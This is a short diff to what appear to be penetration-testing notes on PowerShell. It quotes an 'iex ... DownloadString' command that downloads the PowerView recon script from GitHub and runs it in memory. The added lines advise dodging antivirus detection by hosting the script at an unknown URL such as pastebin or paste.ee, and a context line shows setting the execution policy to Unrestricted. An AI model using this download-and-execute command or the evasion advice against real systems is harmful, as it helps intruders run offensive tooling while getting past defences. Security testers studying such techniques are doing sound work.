@@ -16,7 +16,10 @@ cheatsheet: https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/
 
 > iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"))```
   
-**NOTE:** if AV detects the URL, then just host it somewhere on your own
+**NOTE:** if AV detects the URL, then just host it somewhere on your own.</br>
+It has to be served from a unknown URL, since AV catches the PowerView, PowerShell etc. words.</br>
+One of the solutions is to use an online service like https://pastebin.com, or https://paste.ee
+
 **NOTE:** If execution is forbidden in powershell use this:
 ```powershell
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
